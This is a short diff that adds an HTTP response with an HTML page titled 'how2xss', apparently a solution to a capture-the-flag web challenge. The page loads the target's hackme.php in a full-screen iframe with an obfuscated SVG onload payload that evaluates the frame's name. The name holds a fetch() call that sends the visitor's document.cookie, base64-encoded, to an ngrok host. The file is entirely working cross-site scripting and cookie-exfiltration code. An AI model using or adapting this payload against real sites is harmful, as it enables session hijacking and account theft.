@@ -1,0 +1,12 @@
+HTTP/1.1 200 OK
+
+<!DOCTYPE html>
+<html>
+<title>how2xss</title>
+<iframe
+  src="https://edu-ctf.kaibro.tw:30678/hackme.php?q=<SVG%2FoNLOAD%3Deval(n%26%2397m\\u{65})>"
+  name="fetch('https://670f47c9.ngrok.io/'+btoa(document.cookie));"
+  style="position: fixed; top: 0px; bottom: 0px; right: 0px; width: 100%; border: none;
+  margin: 0; padding: 0; overflow: hidden; z-index: 999999; height: 100%;" >
+</iframe>
+</html>
